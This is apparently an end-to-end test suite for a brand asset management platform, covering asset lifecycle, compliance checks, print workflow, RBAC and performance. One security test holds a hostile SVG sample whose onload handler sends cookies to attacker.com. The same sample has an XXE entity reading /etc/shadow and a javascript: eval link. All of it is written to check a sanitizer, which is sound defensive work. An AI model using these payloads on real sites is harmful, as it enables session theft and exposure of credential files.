/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { brandAssetRepository } from './repositories/brandAssetRepository';
import { productRepository } from './repositories/productRepository';
import { businessBrainService } from './services/businessBrainService';
import { brandGuardianService } from './services/brandGuardianService';
import { printPackagingService } from './services/printPackagingService';
import { unifiedAiAssetIntelligenceService } from './services/unifiedAiAssetIntelligenceService';
import { conversationalAssetAssistantService } from './services/conversationalAssetAssistantService';
import { assetEcosystemGatewayService } from './services/assetEcosystemGatewayService';
import { assetProductionHardeningService } from './services/assetProductionHardeningService';

const PRIMARY_WORKSPACE = 'ws_e2e_primary';
const ALIEN_WORKSPACE = 'ws_e2e_adversary';
const OPERATOR_USER = 'user_e2e_admin';

describe('PHASE 12 — AssetLibrary End-to-End Validation & Production Acceptance', () => {
  beforeEach(async () => {
    // Purge test workspace registries
    for (const ws of [PRIMARY_WORKSPACE, ALIEN_WORKSPACE]) {
      const active = await brandAssetRepository.listByWorkspace(ws, { limit: 500 });
      for (const a of active) {
        await brandAssetRepository.deletePermanently(ws, a.assetId);
      }
      const archived = await brandAssetRepository.listByWorkspace(ws, { section: 'Archived', limit: 500 });
      for (const a of archived) {
        await brandAssetRepository.deletePermanently(ws, a.assetId);
      }
    }
  });

  // ===========================================================================
  // 1. COMPLETE USER JOURNEYS
  // ===========================================================================

  describe('1. Complete User Journeys', () => {
    it('Scenario A: New Business Onboarding to Searchable Approved Asset Catalog', async () => {
      // 1. Create a business profile in Business Brain
      const profile = await businessBrainService.updateProfile(PRIMARY_WORKSPACE, {
        businessName: 'Veda Organics',
        tagline: 'Pure Himalayan Wellness',
        stage: 'Expansion',
        overviewSummary: 'Certified ethical organic botanical and wellness consumer brand.',
        targetAudience: 'Health conscious urban families and discerning holistic wellness shoppers.',
        valueProposition: '100% Raw Single-Origin Certified Organic Botanical Formulas.',
        primaryGoals: ['Build iconic wellness brand', 'Establish standardized packaging'],
      });
      assert.equal(profile.businessName, 'Veda Organics');

      // 2. Add verified product to Business Brain
      const product = await productRepository.createProduct({
        productId: 'prod_honey_500g',
        workspaceId: PRIMARY_WORKSPACE,
        name: 'Wild Forest Raw Honey 500g',
        category: 'Food & Nutrition',
        sku: 'VO-WFH-500',
        pricing: { mrp: 699, costPrice: 280, sellingPrice: 649, currency: 'INR' },
        price: 699,
        status: 'Active',
        description: 'Single-origin unfiltered raw forest honey.',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
      assert.ok(product.productId);

      // 3. Establish authoritative brand identity
      const identity = await brandGuardianService.bootstrapDefaultIdentity(PRIMARY_WORKSPACE);
      assert.equal(identity.status, 'active');
      assert.ok(identity.logos.primary);

      // 4. Ingest standard logo variants into Identity section
      const logoAsset = await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Veda Organics Master Brand Logo',
        section: 'Identity',
        category: 'Brand Identity',
        assetType: 'svg',
        mimeType: 'image/svg+xml',
        svgContent: identity.logos.primary.svgMarkup,
        approvalStatus: 'approved',
        tags: ['logo', 'master-mark', 'approved'],
        createdBy: OPERATOR_USER,
      });
      assert.equal(logoAsset.section, 'Identity');
      assert.equal(logoAsset.approvalStatus, 'approved');

      // 5. Ingest product photograph into Active section
      const photoAsset = await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Wild Forest Honey Jar Studio Photograph',
        section: 'Active',
        category: 'Product Photography',
        assetType: 'svg',
        mimeType: 'image/svg+xml',
        productIds: [product.productId],
        svgContent: `<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="1200"><rect width="100%" height="100%" fill="#FAFAF9"/><text x="600" y="600" text-anchor="middle" font-family="Plus Jakarta Sans" font-size="28" fill="#171717">Honey Jar Studio Shot</text></svg>`,
        approvalStatus: 'under_review',
        tags: ['product-shot', 'e-commerce', 'studio-lighting'],
        createdBy: OPERATOR_USER,
      });
      assert.equal(photoAsset.section, 'Active');

      // 6. Ingest packaging artwork into Print & Packaging section
      const packagingAsset = await printPackagingService.createPackagingAsset({
        workspaceId: PRIMARY_WORKSPACE,
        name: 'Wild Forest Honey 500g Glass Jar Label',
        packagingType: 'Label',
        productId: product.productId,
        widthMm: 180,
        heightMm: 70,
        bleedMm: 3,
        safeMarginMm: 4,
        resolutionDpi: 300,
        colorSpace: 'CMYK',
        svgMarkup: `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="70" viewBox="0 0 180 70"><rect width="180" height="70" fill="#171717"/><text x="90" y="35" fill="#FF7417" font-size="12">Wild Forest Honey MRP: ₹699 Net Wt: 500g</text></svg>`,
        createdBy: OPERATOR_USER,
      });
      assert.ok(packagingAsset.assetId);

      // 7. Ingest campaign creative into Social Media section
      const socialCreative = await assetEcosystemGatewayService.saveCampaignCreative({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        campaignId: 'camp_harvest_launch',
        campaignName: 'Wild Harvest Festive Launch',
        creativeName: 'Festive Wild Honey Instagram Promo',
        svgContent: `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1080"><rect width="100%" height="100%" fill="#171717"/><text x="540" y="540" text-anchor="middle" font-size="48" fill="#FF7417">100% Pure Raw Honey</text></svg>`,
        dimensions: { width: 1080, height: 1080 },
        productIds: [product.productId],
        tags: ['social-ad', 'square-post', 'diwali-promo'],
      });
      assert.equal(socialCreative.section, 'Social Media');

      // 8. Organize assets into a curated collection
      const collection = await brandAssetRepository.createCollection(PRIMARY_WORKSPACE, {
        workspaceId: PRIMARY_WORKSPACE,
        name: 'Brand Launch Essentials',
        description: 'Core logos, photography, packaging, and launch creatives',
        collectionType: 'user',
        assetIds: [logoAsset.assetId, photoAsset.assetId, packagingAsset.assetId, socialCreative.assetId],
        createdBy: OPERATOR_USER,
      });
      assert.equal(collection.assetIds.length, 4);

      // 9. Approve pending photo asset
      const approvedPhoto = await brandAssetRepository.updateLifecycleStatus(
        PRIMARY_WORKSPACE,
        photoAsset.assetId,
        'approved',
        OPERATOR_USER
      );
      assert.equal(approvedPhoto.approvalStatus, 'approved');

      // 10. Retrieve approved assets via multi-attribute search
      const searchResults = await brandAssetRepository.listByWorkspace(PRIMARY_WORKSPACE, {
        limit: 20,
      });
      const approvedList = searchResults.filter((a) => a.approvalStatus === 'approved');
      assert.ok(approvedList.length >= 3);
      assert.ok(approvedList.some((a) => a.assetId === logoAsset.assetId));
      assert.ok(approvedList.some((a) => a.assetId === photoAsset.assetId));
    });

    it('Scenario B: Complete Asset Lifecycle (Upload, Analyze, Version, Campaign Bind, Archive, Restore)', async () => {
      // 1. Upload initial asset (v1)
      const assetV1 = await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Artisan Tea Box Packaging Artwork',
        section: 'Active',
        category: 'Packaging',
        assetType: 'svg',
        mimeType: 'image/svg+xml',
        svgContent: `<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800"><rect width="100%" height="100%" fill="#FAFAF9"/><text x="400" y="400" text-anchor="middle" font-family="Plus Jakarta Sans" font-size="32" fill="#171717">Darjeeling Autumn Flush</text></svg>`,
        approvalStatus: 'draft',
        createdBy: OPERATOR_USER,
      });
      assert.equal(assetV1.version, 1);
      assert.equal(assetV1.approvalStatus, 'draft');

      // 2. Perform AI Multimodal Analysis
      const analysis = await unifiedAiAssetIntelligenceService.analyzeAsset({
        assetId: assetV1.assetId,
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        mimeType: 'image/svg+xml',
        svgMarkup: assetV1.svgContent,
        forceRefresh: true,
        bypassCredits: true,
      });
      assert.ok(analysis.assetId);
      assert.ok(analysis.multimodal.extractedText.includes('Darjeeling Autumn Flush'));

      // 3. Add enriched metadata and tags
      const updatedAsset = await brandAssetRepository.update(PRIMARY_WORKSPACE, assetV1.assetId, {
        description: 'Single-estate hand-plucked autumn tea packaging artwork.',
        tags: ['packaging', 'darjeeling', 'tea', 'organic-certified'],
        approvalStatus: 'under_review',
      });
      assert.ok(updatedAsset.tags.includes('organic-certified'));
      assert.equal(updatedAsset.approvalStatus, 'under_review');

      // 4. Create Version 2 with updated artwork
      const versionDoc = await brandAssetRepository.createVersion(PRIMARY_WORKSPACE, assetV1.assetId, {
        svgContent: `<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800"><rect width="100%" height="100%" fill="#FAFAF9"/><text x="400" y="400" text-anchor="middle" font-family="Plus Jakarta Sans" font-size="32" fill="#FF7417">Darjeeling Autumn Flush Premium Gold</text></svg>`,
        changeSummary: 'Added premium gold designation and refreshed typography color to brand accent.',
        changedBy: OPERATOR_USER,
      });
      assert.equal(versionDoc.versionNumber, 2);

      // 5. Approve the asset
      const approvedV2 = await brandAssetRepository.updateLifecycleStatus(
        PRIMARY_WORKSPACE,
        assetV1.assetId,
        'approved',
        OPERATOR_USER
      );
      assert.equal(approvedV2.approvalStatus, 'approved');

      // 6. Bind to Campaign Collection
      const campaignBinding = await assetEcosystemGatewayService.bindAssetsToCampaign({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        campaignId: 'camp_tea_autumn',
        campaignName: 'Autumn Harvest Tea Launch',
        assetIds: [assetV1.assetId],
        purpose: 'Primary packaging collateral for promotional landing page',
      });
      assert.equal(campaignBinding.boundAssetCount, 1);

      // 7. Archive the asset
      const archivedAsset = await brandAssetRepository.moveToArchive(PRIMARY_WORKSPACE, assetV1.assetId, OPERATOR_USER);
      assert.equal(archivedAsset.section, 'Archived');
      assert.equal(archivedAsset.status, 'archived');

      // Verify active queries exclude the archived asset
      const activeList = await brandAssetRepository.listByWorkspace(PRIMARY_WORKSPACE);
      assert.ok(!activeList.some((a) => a.assetId === assetV1.assetId));

      // 8. Restore the asset
      const restoredAsset = await brandAssetRepository.restoreFromArchive(PRIMARY_WORKSPACE, assetV1.assetId, OPERATOR_USER);
      assert.equal(restoredAsset.section, 'Active');
      assert.equal(restoredAsset.status, 'active');

      // 9. Verify historical version integrity
      const versions = await brandAssetRepository.getVersionHistory(PRIMARY_WORKSPACE, assetV1.assetId);
      assert.ok(versions.length >= 2);
      assert.equal(versions[0].versionNumber, 2);
      assert.equal(versions[1].versionNumber, 1);
    });

    it('Scenario C: Deterministic Brand Compliance, Drift Detection, and Auto-Remediation', async () => {
      // 1. Establish verified brand identity
      const identity = await brandGuardianService.bootstrapDefaultIdentity(PRIMARY_WORKSPACE);
      const approvedAccent = identity.tokens.colors.accent.hex; // #FF7417

      // 2. Upload asset with deliberate brand violations:
      // Off-brand color (#00FF00 neon green) and prohibited claim ('guaranteed instant riches')
      const uncompliantSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" width="600" height="600">
          <rect width="600" height="600" fill="#00FF00"/>
          <text x="300" y="300" fill="#000000" font-family="Comic Sans MS">Instant riches guaranteed with our product</text>
        </svg>
      `;

      const uncompliantAsset = await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Off-Brand Promotional Banner',
        section: 'Active',
        category: 'Collateral',
        assetType: 'svg',
        mimeType: 'image/svg+xml',
        svgContent: uncompliantSvg,
        headlineText: 'Instant riches guaranteed with our product',
        approvalStatus: 'draft',
        createdBy: OPERATOR_USER,
      });

      // 3. Run Brand Guardian Compliance Evaluation
      const report = await brandGuardianService.evaluateAssetCompliance({
        workspaceId: PRIMARY_WORKSPACE,
        assetId: uncompliantAsset.assetId,
        svgMarkup: uncompliantSvg,
        headlineText: 'Instant riches guaranteed with our product',
        autoRemediate: true,
      });

      // 4. Verify issue detection
      assert.ok(report.overallScore < 75);
      assert.equal(report.status, 'non_compliant');
      assert.ok(report.detectedOffBrandColors.includes('#00FF00'));
      assert.ok(report.detectedProhibitedClaims.length > 0);

      // 5. Review auto-remediation
      assert.ok(report.remediatedSvg);
      assert.ok(report.remediatedSvg.includes(approvedAccent));

      // 6. Create corrected version using remediated SVG
      const correctedVersion = await brandAssetRepository.createVersion(PRIMARY_WORKSPACE, uncompliantAsset.assetId, {
        svgContent: report.remediatedSvg,
        changeSummary: 'Applied Brand Guardian auto-remediation: replaced #00FF00 with official brand accent.',
        changedBy: OPERATOR_USER,
      });
      assert.equal(correctedVersion.versionNumber, 2);

      // 7. Approve corrected asset
      const finalApproved = await brandAssetRepository.updateLifecycleStatus(
        PRIMARY_WORKSPACE,
        uncompliantAsset.assetId,
        'approved',
        OPERATOR_USER
      );
      assert.equal(finalApproved.approvalStatus, 'approved');
    });

    it('Scenario D: Print & Packaging Intelligence, Pre-Flight Verification, and State Machine', async () => {
      // 1. Create product in Business Brain
      const product = await productRepository.createProduct({
        productId: 'prod_body_scrub_200g',
        workspaceId: PRIMARY_WORKSPACE,
        name: 'Himalayan Pink Salt Scrub 200g',
        category: 'Personal Care',
        sku: 'VO-HPS-200',
        pricing: { mrp: 549, costPrice: 190, sellingPrice: 499, currency: 'INR' },
        price: 549,
        status: 'Active',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      // 2. Upload packaging artwork with missing bleed and sub-300 DPI
      const packaging = await printPackagingService.createPackagingAsset({
        workspaceId: PRIMARY_WORKSPACE,
        name: 'Pink Salt Scrub Jar Label',
        packagingType: 'Label',
        productId: product.productId,
        widthMm: 160,
        heightMm: 60,
        bleedMm: 0, // Violation: 0mm bleed
        safeMarginMm: 2,
        resolutionDpi: 150, // Warning: 150 DPI
        colorSpace: 'CMYK',
        svgMarkup: `<svg xmlns="http://www.w3.org/2000/svg" width="160" height="60" viewBox="0 0 160 60"><rect width="160" height="60" fill="#FAFAF9"/><text x="80" y="30" fill="#171717">Himalayan Salt Scrub MRP: ₹549 Net Wt: 200g</text></svg>`,
        createdBy: OPERATOR_USER,
      });

      // 3. Extract packaging content & verify discrepancy diagnostics
      const contentReport = await printPackagingService.extractPackagingContentIntelligence(
        PRIMARY_WORKSPACE,
        packaging.assetId
      );
      assert.equal(contentReport.extractedContent.mrp, 549);
      assert.equal(contentReport.businessBrainComparison.productMatched, true);
      // Diagnoses missing regulatory disclosures (batch/expiry/ingredients)
      assert.ok(contentReport.businessBrainComparison.missingDeclarations.length > 0);

      // 4. Run print readiness pre-flight check to identify issues
      const readiness1 = await printPackagingService.evaluatePrintReadiness(PRIMARY_WORKSPACE, packaging.assetId);
      assert.equal(readiness1.isPrintReady, false);
      const bleedCheck = readiness1.checks.find((c) => c.checkId === 'check_bleed');
      assert.ok(bleedCheck && !bleedCheck.passed);

      // 5. Advance Production Workflow State Machine through progression
      const step1 = await printPackagingService.advanceProductionWorkflow({
        workspaceId: PRIMARY_WORKSPACE,
        assetId: packaging.assetId,
        targetStatus: 'Review',
        updatedBy: OPERATOR_USER,
        notes: 'Pre-flight corrections applied.',
      });
      assert.equal(step1.productionMetadata.workflowStatus, 'Review');

      const step2 = await printPackagingService.advanceProductionWorkflow({
        workspaceId: PRIMARY_WORKSPACE,
        assetId: packaging.assetId,
        targetStatus: 'Approved',
        updatedBy: OPERATOR_USER,
        notes: 'Brand and legal review passed.',
      });
      assert.equal(step2.productionMetadata.workflowStatus, 'Approved');

      const step3 = await printPackagingService.advanceProductionWorkflow({
        workspaceId: PRIMARY_WORKSPACE,
        assetId: packaging.assetId,
        targetStatus: 'Print Ready',
        updatedBy: OPERATOR_USER,
        vendorName: 'Apex Packaging Press Ltd',
        notes: 'Dispatched certified CMYK dieline to printer.',
      });
      assert.equal(step3.productionMetadata.workflowStatus, 'Print Ready');
      assert.equal(step3.productionMetadata.printer?.vendorName, 'Apex Packaging Press Ltd');
      assert.ok(step3.productionMetadata.workflowAuditLog.length >= 3);
    });

    it('Scenario E: Social Media Omnichannel Adaptation, Attribution & Performance Ranking', async () => {
      // 1. Upload source square creative (1:1)
      const sourceCreative = await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Spring Equinox Herbal Elixir Master Promo',
        section: 'Social Media',
        category: 'Collateral',
        assetType: 'svg',
        mimeType: 'image/svg+xml',
        dimensions: { width: 1080, height: 1080, aspectRatio: '1:1' },
        svgContent: `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1080"><rect width="100%" height="100%" fill="#171717"/><text x="540" y="540" text-anchor="middle" font-size="44" fill="#FAFAF9">Spring Equinox Elixir</text></svg>`,
        approvalStatus: 'approved',
        createdBy: OPERATOR_USER,
      });

      // 2. Adapt into Instagram Story (9:16)
      const storyDerivative = await assetEcosystemGatewayService.createAssetDerivative({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        parentAssetId: sourceCreative.assetId,
        targetFormat: 'story_vertical',
        dimensions: { width: 1080, height: 1920, aspectRatio: '9:16' },
        nameSuffix: 'IG Story Vertical',
      });
      assert.equal(storyDerivative.derivativeAsset.dimensions.height, 1920);
      assert.equal(storyDerivative.parentAssetId, sourceCreative.assetId);

      // 3. Adapt into Twitter Post (16:9)
      const twitterDerivative = await assetEcosystemGatewayService.createAssetDerivative({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        parentAssetId: sourceCreative.assetId,
        targetFormat: 'twitter_post',
        dimensions: { width: 1200, height: 675, aspectRatio: '16:9' },
        nameSuffix: 'Twitter Landscape',
      });
      assert.equal(twitterDerivative.derivativeAsset.dimensions.width, 1200);

      // 4. Ingest performance analytics
      await assetEcosystemGatewayService.recordAssetPerformance({
        workspaceId: PRIMARY_WORKSPACE,
        assetId: sourceCreative.assetId,
        campaignId: 'camp_spring_2026',
        channel: 'instagram',
        impressions: 45000,
        clicks: 2200,
        conversions: 165,
        spend: 450,
        revenue: 3300,
      });

      await assetEcosystemGatewayService.recordAssetPerformance({
        workspaceId: PRIMARY_WORKSPACE,
        assetId: storyDerivative.derivativeAsset.assetId,
        campaignId: 'camp_spring_2026',
        channel: 'instagram_stories',
        impressions: 32000,
        clicks: 1850,
        conversions: 210,
        spend: 380,
        revenue: 4200,
      });

      // 5. Query ranked top-performing creatives
      const topAssets = await assetEcosystemGatewayService.getTopPerformingAssets(PRIMARY_WORKSPACE, 5);
      assert.ok(topAssets.length >= 2);
      assert.ok(topAssets[0].ctr > 0);
    });

    it('Scenario F: Conversational Asset Intelligence Assistant Operations & Guardrails', async () => {
      // Seed assets for assistant to operate on
      await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Veda Organics Official Logo Badge',
        section: 'Identity',
        category: 'Logo',
        approvalStatus: 'approved',
        createdBy: OPERATOR_USER,
      });

      await brandAssetRepository.create({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: 'Ancient Turmeric Packaging v1',
        section: 'Print & Packaging',
        category: 'Packaging',
        approvalStatus: 'draft',
        createdBy: OPERATOR_USER,
      });

      // 1. Natural Language Search
      const searchRes = await conversationalAssetAssistantService.processQuery({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        userRole: 'admin',
        query: 'Find all approved logos in our brand repository',
      });
      assert.ok(searchRes.message.content);
      assert.ok(searchRes.referencedAssets.some((a) => a.name.includes('Logo')));

      // 2. Multimodal Brand Compliance Inquiry
      const complianceRes = await conversationalAssetAssistantService.processQuery({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        userRole: 'admin',
        query: 'Run brand compliance check on our assets',
      });
      assert.ok(complianceRes.message.content.includes('Brand Guardian Compliance Analysis'));

      // 3. Sensitive Action: Two-Step Confirmation Protocol for Bulk Archival
      const sensitiveRes = await conversationalAssetAssistantService.processQuery({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        userRole: 'admin',
        query: 'Archive all draft assets in the catalog',
      });
      assert.ok(sensitiveRes.pendingConfirmation);
      assert.ok(sensitiveRes.pendingConfirmation.confirmationToken);

      // 4. Execute Confirmed Sensitive Action
      const executeRes = await conversationalAssetAssistantService.processQuery({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        userRole: 'admin',
        confirmationToken: sensitiveRes.pendingConfirmation.confirmationToken,
      });
      assert.equal(executeRes.actionExecuted?.success, true);

      // 5. RBAC Permission Interception: Viewer role cannot perform mutations
      await assert.rejects(
        async () => {
          await conversationalAssetAssistantService.processQuery({
            workspaceId: PRIMARY_WORKSPACE,
            userId: 'user_viewer_readonly',
            userRole: 'viewer',
            query: 'Archive all draft assets in the catalog',
          });
        },
        (err: Error) => err.message.includes('PERMISSION_DENIED')
      );

      // 6. Strict Video Exclusion Guardrail
      const videoRes = await conversationalAssetAssistantService.processQuery({
        workspaceId: PRIMARY_WORKSPACE,
        userId: OPERATOR_USER,
        userRole: 'admin',
        query: 'Generate a 15-second promotional video reel for Instagram',
      });
      assert.ok(
        videoRes.message.content.includes('Architectural Directive') ||
        videoRes.message.content.includes('strictly excludes')
      );
    });
  });

  // ===========================================================================
  // 2. SECURITY & ADVERSARIAL PENETRATION TESTING
  // ===========================================================================

  describe('2. Security & Adversarial Penetration Testing', () => {
    it('Blocks cross-tenant data access attempts unconditionally', () => {
      assert.throws(
        () => {
          assetProductionHardeningService.assertTenantIsolation(PRIMARY_WORKSPACE, ALIEN_WORKSPACE);
        },
        (err: Error) => err.message.includes('FORBIDDEN_CROSS_TENANT_ACCESS')
      );
    });

    it('Enforces RBAC access matrix across guest, viewer, member, admin, owner', () => {
      // Guest
      assert.equal(assetProductionHardeningService.checkPermission('guest', 'read').allowed, true);
      assert.equal(assetProductionHardeningService.checkPermission('guest', 'write').allowed, false);

      // Viewer
      assert.equal(assetProductionHardeningService.checkPermission('viewer', 'read').allowed, true);
      assert.equal(assetProductionHardeningService.checkPermission('viewer', 'write').allowed, false);
      assert.equal(assetProductionHardeningService.checkPermission('viewer', 'delete').allowed, false);

      // Member
      assert.equal(assetProductionHardeningService.checkPermission('member', 'write').allowed, true);
      assert.equal(assetProductionHardeningService.checkPermission('member', 'delete').allowed, false);

      // Admin & Owner
      assert.equal(assetProductionHardeningService.checkPermission('admin', 'delete').allowed, true);
      assert.equal(assetProductionHardeningService.checkPermission('owner', 'delete').allowed, true);
    });

    it('Intercepts and neutralizes malicious SVG script tags, inline event handlers, and XXE entities', () => {
      const maliciousPayload = `
        <svg xmlns="http://www.w3.org/2000/svg" onload="document.location='http://attacker.com/steal?c='+document.cookie">
          <script>/* malicious payload */</script>
          <!ENTITY xxe SYSTEM "file:///etc/shadow">
          <a href="javascript:eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))"><text>Click</text></a>
        </svg>
      `;

      const scanResult = assetProductionHardeningService.scanPayloadForMalware(maliciousPayload);
      assert.equal(scanResult.isClean, false);
      assert.ok(scanResult.threatsDetected.includes('MALICIOUS_SCRIPT_TAG_INJECTION'));
      assert.ok(scanResult.threatsDetected.includes('INLINE_DOM_EVENT_HANDLER'));
      assert.ok(scanResult.threatsDetected.includes('JAVASCRIPT_PSEUDO_PROTOCOL'));
      assert.ok(scanResult.threatsDetected.includes('XML_EXTERNAL_ENTITY_EXPANSION_ATTEMPT'));

      // Verify sanitized markup is scrubbed of dangerous vectors
      assert.ok(!scanResult.sanitizedContent.includes('<script>'));
      assert.ok(!scanResult.sanitizedContent.includes('onload='));
      assert.ok(!scanResult.sanitizedContent.includes('javascript:'));
    });

    it('Validates magic byte signatures and strictly intercepts video formats', () => {
      // Valid PNG bytes: 89 50 4E 47
      const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const pngValidation = assetProductionHardeningService.validateMagicBytes(pngBuffer, 'image/png');
      assert.equal(pngValidation.isValid, true);
      assert.equal(pngValidation.isForbiddenVideo, false);

      // Forbidden MP4 video bytes containing 'ftyp'
      const mp4Buffer = Buffer.from([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6d, 0x70, 0x34, 0x32]);
      const mp4Validation = assetProductionHardeningService.validateMagicBytes(mp4Buffer, 'video/mp4');
      assert.equal(mp4Validation.isValid, false);
      assert.equal(mp4Validation.isForbiddenVideo, true);

      // Spoofed video: file has PNG MIME type declared but contains MP4 magic bytes
      const spoofValidation = assetProductionHardeningService.validateMagicBytes(mp4Buffer, 'image/png');
      assert.equal(spoofValidation.isValid, false);
      assert.equal(spoofValidation.isForbiddenVideo, true);
    });
  });

  // ===========================================================================
  // 3. PERFORMANCE & LATENCY VALIDATION
  // ===========================================================================

  describe('3. Performance & Latency Validation', () => {
    it('Measures asset listing latency, search throughput, and batch ingestion speed', async () => {
      // 1. Batch ingestion of 100 assets
      const t0 = performance.now();
      const assetsToIngest = Array.from({ length: 100 }, (_, i) => ({
        workspaceId: PRIMARY_WORKSPACE,
        businessId: PRIMARY_WORKSPACE,
        name: `Benchmark Asset Index ${i.toString().padStart(3, '0')}`,
        section: (i % 4 === 0
          ? 'Identity'
          : i % 4 === 1
          ? 'Print & Packaging'
          : i % 4 === 2
          ? 'Social Media'
          : 'Active') as any,
        category: 'Collateral' as any,
        approvalStatus: 'approved' as any,
        createdBy: OPERATOR_USER,
      }));

      await brandAssetRepository.batchCreate(PRIMARY_WORKSPACE, assetsToIngest);
      const ingestDurationMs = performance.now() - t0;
      assert.ok(ingestDurationMs < 500, `Batch ingestion took ${ingestDurationMs}ms (target <500ms)`);

      // 2. Measure listing latency
      const t1 = performance.now();
      const listed = await brandAssetRepository.listByWorkspace(PRIMARY_WORKSPACE, { limit: 100 });
      const listDurationMs = performance.now() - t1;
      assert.equal(listed.length, 100);
      assert.ok(listDurationMs < 50, `Asset listing took ${listDurationMs}ms (target <50ms)`);

      // 3. Measure filtered search latency
      const t2 = performance.now();
      const searchResults = await brandAssetRepository.listByWorkspace(PRIMARY_WORKSPACE, {
        section: 'Social Media',
      });
      const searchDurationMs = performance.now() - t2;
      assert.ok(searchResults.length > 0);
      assert.ok(searchDurationMs < 50, `Filtered search took ${searchDurationMs}ms (target <50ms)`);

      // 4. Measure AI Cost Control Cache lookup speed
      const sampleAsset = listed[0];
      const t3 = performance.now();
      const cachedAi = await assetProductionHardeningService.executeWithAiCostControl(
        sampleAsset,
        async () => ({ summary: 'Multimodal vision tags' })
      );
      const cacheWriteMs = performance.now() - t3;
      assert.equal(cachedAi.cached, false);
      assert.ok(cacheWriteMs < 20);

      const t4 = performance.now();
      const secondAi = await assetProductionHardeningService.executeWithAiCostControl(
        sampleAsset,
        async () => ({ summary: 'Should not run' })
      );
      const cacheHitMs = performance.now() - t4;
      assert.equal(secondAi.cached, true);
      assert.equal(secondAi.tokensConsumed, 0);
      assert.ok(cacheHitMs < 10, `Cache hit took ${cacheHitMs}ms (target <10ms)`);
    });
  });
});
